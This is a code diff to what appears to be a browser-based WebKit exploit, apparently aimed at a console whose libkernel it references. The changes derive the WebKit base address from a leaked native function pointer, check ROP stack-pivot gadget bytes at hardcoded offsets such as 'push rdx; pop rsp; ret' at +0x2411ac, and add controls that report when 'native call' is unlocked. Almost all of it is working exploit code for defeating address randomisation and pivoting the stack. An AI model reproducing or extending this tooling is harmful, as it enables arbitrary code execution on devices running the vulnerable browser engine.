@@ -13,6 +13,7 @@ import {
     mergeScannedPivot,
     loadScannedPivot,
     saveScannedPivot,
+    sanitizeScannedPivotStorage,
     G5_PATTERNS,
     checkG5Bytes,
     g5DerivedHint,
@@ -20,7 +21,7 @@ import {
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828n";
+const BUILD_ID = "rw-20250828p";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -233,6 +234,8 @@ function setUi() {
         g5BarBtns[i].disabled = busy || !ready;
     const btnClearPivot = $("btn-clear-pivot");
     if (btnClearPivot) btnClearPivot.disabled = busy;
+    const btnRestorePivot = $("btn-restore-pivot");
+    if (btnRestorePivot) btnRestorePivot.disabled = busy;
 }
 
 function updatePivotReady(p, off) {
@@ -267,8 +270,16 @@ function fmtBytes(arr) {
 function basesFromSession(off) {
     const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
     let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
-    if (!webkitBase && nativeFn && off.wk_expm1_builtin)
-        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+    let derived = null;
+    if (nativeFn && off.wk_expm1_builtin)
+        derived = nativeFn.sub32(off.wk_expm1_builtin);
+    if (derived) {
+        if (!webkitBase || !same64(webkitBase, derived)) {
+            if (webkitBase && nativeFn)
+                mark("BASE-FIX", "webkitBase stale cached — using nativeFn-expm1");
+            webkitBase = derived;
+        }
+    }
     let libkernelBase = parseAddr(sessionStorage.getItem("wk-libkernelBase"));
     return { nativeFn, webkitBase, libkernelBase };
 }
@@ -466,7 +477,9 @@ function saveBasesManual() {
             return;
         }
         try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
-        const webkitBase = resolveWebkitBase(off, nativeFn);
+        const webkitBase = (nativeFn && off.wk_expm1_builtin)
+            ? nativeFn.sub32(off.wk_expm1_builtin)
+            : resolveWebkitBase(off, nativeFn);
         if (webkitBase) {
             try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
             mark("SAVE-OK", "nativeFn=" + nativeFn + " webkitBase=" + webkitBase);
@@ -480,26 +493,53 @@ function saveBasesManual() {
     }
 }
 
-function applyG5Rva(rva) {
-    const found = loadScannedPivot() || Object.assign({}, PIVOT_HW_1352);
-    found.wk_PUSH_RDX_POP_RSP_RET = rva;
-    const { webkitBase } = basesFromSession(loadEffectiveOff());
-    if (webkitBase) saveScannedPivot(webkitBase, found);
-    else {
-        try { sessionStorage.setItem("wk-scanned-pivot", JSON.stringify(found)); } catch (_) { }
+function gadgetBytesHex(p, base, rva, n) {
+    const out = [];
+    for (let i = 0; i < n; i++) {
+        const b = read1p(p, base.add32(rva + i));
+        out.push(b == null ? "??" : (b & 0xff).toString(16).padStart(2, "0"));
     }
+    return out.join(" ");
+}
+
+function pivotRowByLabel(label) {
+    const base = label.split(" ")[0];
+    for (let i = 0; i < PIVOT_ROWS.length; i++) {
+        if (PIVOT_ROWS[i][0] === base) return PIVOT_ROWS[i];
+    }
+    return null;
+}
+
+function logPivotBadBytes(p, webkitBase, off, labels) {
+    for (let i = 0; i < labels.length; i++) {
+        const lab = labels[i].split(" ")[0];
+        const row = pivotRowByLabel(lab);
+        if (!row) continue;
+        const rva = off[row[1]];
+        if (rva == null) continue;
+        const pat = pivotPattern(row, off);
+        const n = lab === "G5" ? 6 : Math.max(pat.length, 4);
+        mark("PIVOT-HEX", lab + " +0x" + rva.toString(16)
+            + " got " + gadgetBytesHex(p, webkitBase, rva, n)
+            + (lab === "G5" ? " (want 52 5c c3 or 48 89 d4 c3)" : ""));
+    }
+}
+
+function pivotNotReadyMsg(v) {
+    const parts = [];
+    if (v.missing.length) parts.push("missing " + v.missing.join(", "));
+    if (v.bad.length) parts.push("bad " + v.bad.join(", "));
+    return parts.length ? parts.join("; ") : "?";
+}
+
+function applyG5Rva(rva) {
+    const { webkitBase } = basesFromSession(loadEffectiveOff());
+    saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: rva });
     mark("G5-SET", "+0x" + rva.toString(16) + " saved — verifying…");
-    if (ready && window.p) {
-        const p = window.p;
-        const off = loadEffectiveOff();
-        updatePivotReady(p, off);
-        if (webkitBase) {
-            const g5 = checkG5Bytes((a) => read1p(p, a), webkitBase, rva);
-            mark(g5 ? "GADGET-OK" : "GADGET-BAD",
-                "G5 +0x" + rva.toString(16)
-                    + (g5 ? " " + g5.kind : " — bytes mismatch"));
-            updatePivotReady(p, off);
-        }
+    if (ready && window.p && webkitBase) {
+        verifyPivotManual();
+    } else if (!webkitBase) {
+        mark("G5-HINT", "Save bases then tap Verify pivot");
     }
     setUi();
 }
@@ -510,10 +550,22 @@ function clearPivotState() {
         sessionStorage.removeItem("wk-scanned-pivot");
         sessionStorage.removeItem("wk-scanned-pivot-base");
     } catch (_) { }
+    sanitizeScannedPivotStorage();
     pivotScan = null;
     pivotReady = false;
-    mark("PIVOT-CLEAR", "G5 + scan state cleared");
+    mark("PIVOT-CLEAR", "G5 + scan state cleared — G0-G4 restored to HW table");
     setUi();
+}
+
+function restoreHwPivot() {
+    sanitizeScannedPivotStorage();
+    try {
+        sessionStorage.removeItem("wk-pivot-scan-state");
+    } catch (_) { }
+    pivotScan = null;
+    mark("PIVOT-RESTORE", "G0-G4 HW RVAs restored — only G5 from session if set");
+    if (ready && window.p) verifyPivotManual();
+    else setUi();
 }
 
 function peekG5Rva(rva) {
@@ -578,6 +630,15 @@ function wireG5Bar() {
     clearBtn.disabled = false;
     wireClick(clearBtn, function () { clearPivotState(); });
     clearHost.appendChild(clearBtn);
+
+    const restoreBtn = document.createElement("button");
+    restoreBtn.type = "button";
+    restoreBtn.className = "secondary";
+    restoreBtn.id = "btn-restore-pivot";
+    restoreBtn.textContent = "Restore HW pivot";
+    restoreBtn.disabled = false;
+    wireClick(restoreBtn, function () { restoreHwPivot(); });
+    clearHost.appendChild(restoreBtn);
 
     const hint = host.querySelector(".bar-label");
     if (hint && g0 != null) {
@@ -1260,14 +1321,19 @@ function verifyPivotManual() {
     const off = loadEffectiveOff();
     const { webkitBase } = basesFromSession(off);
     if (!webkitBase) {
-        mark("PIVOT-SKIP", "no webkitBase");
+        mark("PIVOT-SKIP", "no webkitBase — Save bases first");
         return;
     }
+    const g5rva = off.wk_PUSH_RDX_POP_RSP_RET;
+    mark("PIVOT-CHECK", "G5="
+        + (g5rva != null ? "+0x" + g5rva.toString(16) : "not set — tap G5 +0x2411ac"));
     const v = verifyPivotSet(addr => read1p(p, addr), webkitBase, off);
     if (v.missing.length)
-        mark("PIVOT-MISS", v.missing.join(", ") + " — tap Scan pivot (1 chunk)");
-    if (v.bad.length)
-        mark("PIVOT-BAD", v.bad.join(", ") + " — wrong RVAs, rescan");
+        mark("PIVOT-MISS", v.missing.join(", ") + " — tap a G5 button above");
+    if (v.bad.length) {
+        mark("PIVOT-BAD", v.bad.join(", ") + " — bytes mismatch at RVA");
+        logPivotBadBytes(p, webkitBase, off, v.bad);
+    }
     if (v.good.length)
         mark("PIVOT-OK", v.good.join(", "));
     pivotReady = v.ok;
@@ -1275,7 +1341,7 @@ function verifyPivotManual() {
         mark("PIVOT-READY", v.count + "/" + v.total + " — Native call unlocked");
         state("pivot chain OK — Native call enabled", "ok");
     } else {
-        state("pivot not ready — need " + (v.missing.join(", ") || "?"), "warn");
+        state("pivot not ready — " + pivotNotReadyMsg(v), "warn");
     }
     setUi();
 }
@@ -1700,6 +1766,8 @@ function init() {
             sessionStorage.removeItem("wk-scanned-pivot-base");
         } catch (_) { }
     }
+    if (sanitizeScannedPivotStorage())
+        mark("PIVOT-FIX", "removed poisoned G0-G4 scan RVAs from session");
 
     const g5raw = params.get("g5");
     if (g5raw) {
